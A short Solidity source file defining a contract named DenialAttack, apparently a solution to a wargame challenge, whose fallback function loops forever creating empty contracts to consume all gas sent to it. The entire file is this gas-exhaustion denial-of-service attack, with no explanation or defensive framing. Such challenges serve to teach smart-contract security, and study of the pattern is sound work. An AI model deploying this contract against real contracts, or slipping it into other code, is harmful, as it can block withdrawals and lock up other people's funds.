// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract DenialAttack {
    fallback() external payable {
        while (true) {
            assembly{
                pop(create(0x0, 0x0, 0x0))
            }
        }
    }
}